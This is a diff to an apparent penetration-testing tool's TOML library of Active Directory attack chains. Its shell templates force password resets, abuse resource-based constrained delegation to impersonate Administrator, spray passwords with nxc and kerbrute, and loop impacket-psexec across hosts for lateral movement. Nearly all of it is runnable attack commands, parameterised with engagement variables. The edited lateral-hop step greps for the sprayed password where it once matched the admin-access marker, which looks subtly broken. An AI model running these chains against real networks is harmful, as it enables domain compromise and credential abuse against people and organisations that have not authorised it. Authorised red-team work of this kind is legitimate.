@@ -5,6 +5,14 @@ order = 34
 
 # Multi-step attack chains. These are documentation-as-commands — most paste a
 # `bash -c '...'` style multi-command pipeline you can edit before running.
+#
+# Engagement variables (`:variable`) — separate from cred profile {password}:
+#   spray_password      — one password sprayed across user lists
+#   new_password        — password set on users you create/reset
+#   computer_password   — machine account password (addcomputer / RBCD)
+#   evil_twin_psk       — decoy WPA PSK (wifi hostapd evil twin)
+#   smb_server_user / smb_server_password — impacket smbserver creds
+#   eap_tls_key_pass    — EAP TLS key export password
 
 # === Kerberoast → crack → DCSync ===
 
@@ -45,8 +53,8 @@ when = "creds.kind == 'plaintext'"
 [[command]]
 id = "chain.genericwrite.forcepw"
 title = "GenericAll on user → force password reset"
-template = """bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' set password TARGET_USER 'Pwn3d!1' \\
- && nxc smb {target} -u TARGET_USER -p 'Pwn3d!1'"""
+template = """bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' set password TARGET_USER '{new_password}' \\
+ && nxc smb {target} -u TARGET_USER -p '{new_password}'"""
 requires = ["bloodyAD", "nxc"]
 tags = ["chain", "forcechangepw"]
 when = "creds.kind == 'plaintext' and target.has_dc"
@@ -56,9 +64,9 @@ when = "creds.kind == 'plaintext' and target.has_dc"
 [[command]]
 id = "chain.rbcd.full"
 title = "RBCD: add computer → write RBCD → S4U → psexec"
-template = """impacket-addcomputer '{domain}/{user}:{password}' -computer-name 'CHRONO\\$' -computer-pass 'Mach1neP@ss!' -dc-host {dc} \\
+template = """impacket-addcomputer '{domain}/{user}:{password}' -computer-name 'CHRONO\\$' -computer-pass '{computer_password}' -dc-host {dc} \\
  && bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add rbcd TARGET_HOST\\$ CHRONO\\$ \\
- && impacket-getST -spn 'cifs/TARGET_HOST.{domain}' -impersonate Administrator '{domain}/CHRONO\\$:Mach1neP@ss!' -dc-ip {dc} \\
+ && impacket-getST -spn 'cifs/TARGET_HOST.{domain}' -impersonate Administrator '{domain}/CHRONO\\$:{computer_password}' -dc-ip {dc} \\
  && export KRB5CCNAME=Administrator.ccache \\
  && impacket-psexec -k -no-pass '{domain}/Administrator@TARGET_HOST.{domain}'"""
 requires = ["impacket-addcomputer", "bloodyAD", "impacket-getST", "impacket-psexec"]
@@ -106,14 +114,14 @@ when = "creds.kind in ['plaintext','kerberos'] and target.has_dc"
 [[command]]
 id = "chain.spray.slow"
 title = "Slow password spray (one pass / 30min per round)"
-template = "nxc smb {target} -u users.txt -p 'Spring2025!' --jitter 5 --continue-on-success"
+template = "nxc smb {target} -u users.txt -p '{spray_password}' --jitter 5 --continue-on-success"
 requires = ["nxc"]
 tags = ["chain", "spray"]
 
 [[command]]
 id = "chain.spray.kerbrute_chunked"
 title = "Kerbrute spray (chunked, less noisy)"
-template = "kerbrute passwordspray -d {domain} --dc {dc} --delay 30000 users.txt 'Welcome1!'"
+template = "kerbrute passwordspray -d {domain} --dc {dc} --delay 30000 users.txt '{spray_password}'"
 requires = ["kerbrute"]
 tags = ["chain", "spray"]
 when = "target.has_dc"
@@ -122,9 +130,9 @@ when = "target.has_dc"
 
 [[command]]
 id = "chain.lateral.hop"
-title = "Lateral hop: nxc test → impacket-psexec on first :Pwn3d:"
-template = """nxc smb {target} -u {user} -p '{password}' -d {domain} --continue-on-success | grep 'Pwn3d!' | awk '{{print $2}}' > pwn3d_hosts.txt \\
- && for h in $(cat pwn3d_hosts.txt); do impacket-psexec '{domain}/{user}:{password}@'$h ; done"""
+title = "Lateral hop: nxc spray one user → impacket-psexec on hits"
+template = """nxc smb {target} -u {user} -p '{spray_password}' -d {domain} --continue-on-success | grep -F '{spray_password}' | awk '{{print $2}}' > pwn3d_hosts.txt \\
+ && for h in $(cat pwn3d_hosts.txt); do impacket-psexec '{domain}/{user}:{spray_password}@'$h ; done"""
 requires = ["nxc", "impacket-psexec"]
 tags = ["chain", "lateral"]
 when = "creds.kind == 'plaintext'"
